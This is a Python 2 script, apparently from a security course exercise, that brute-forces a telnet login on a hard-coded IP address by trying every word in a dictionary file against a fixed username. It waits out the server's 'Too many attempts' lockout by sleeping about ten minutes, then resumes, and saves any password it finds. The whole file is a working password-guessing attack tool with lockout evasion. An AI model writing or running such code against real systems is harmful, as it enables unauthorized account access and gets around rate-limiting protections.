#!/usr/bin/env python

import socket
import errno
import requests
import getpass
import sys
import telnetlib
import time
import re
import utils
from requests.auth import HTTPBasicAuth
import personalServer as ps

UNAME = 'ceneri' 
IP_ADDRESS = '128.114.59.215'

IN_FILE = "personalServer.txt"
OUT_FILE = "dictionaryPasswd.txt"
DICT_FILE = "dictionary.txt"

def get_p_port():
	file = open(IN_FILE, "r")

	for line in file:
		pPort = line[:-1]

	file.close()
	return pPort

def main():

	HOST = IP_ADDRESS

	#Open output files
	file = open(OUT_FILE, "w")

	#Get input from txt files
	dictionary = utils.get_file_input_as_list(DICT_FILE)
	personalPort = get_p_port()
	skeletonKey = ps.get_s_key()
	dictLen = len(dictionary)

	#Regular expressions needed
	pw = re.compile("Pass")
	toomany = re.compile("Too many")
	

	#Test every possible password in dictionary
	for pwd in dictionary:

		try: 

			#Handshake
			tnet = telnetlib.Telnet(HOST, personalPort)

			tnet.write(skeletonKey + "\n")

			tnet.read_until("Username: ")

			tnet.write(UNAME + "\n")

			expected = tnet.expect([toomany, pw])

			indexFound = expected[0]

			#If too many attempt have been made
			if indexFound == 0:

				#Sleep
				print pwd, "could not be tested because of too many attempts, Sleeping 600 seconds"
				time.sleep(605)

				#Attempt conection again after sleep
				tnet = telnetlib.Telnet(HOST, personalPort)

				tnet.write(skeletonKey + "\n")

				tnet.read_until("Username: ")

				tnet.write(UNAME + "\n")

				expected = tnet.expect([toomany, pw])

			#Try password
			tnet.write(pwd + "\n")

			consoleRead = tnet.read_until('Command')

			match = re.search('Incorrect', consoleRead)
		
			#If response matches 'Incorrect', not a password try another one
			if match:
				print "Not a password:", pwd
				continue
			
			#Password found, save it to outut file
			else:
				print "PASSWORD:", pwd
				file.write(pwd + '\n')
				break

		except EOFError, v:

			print "Exception"
			continue

	file.close()


if __name__ == '__main__':
	main()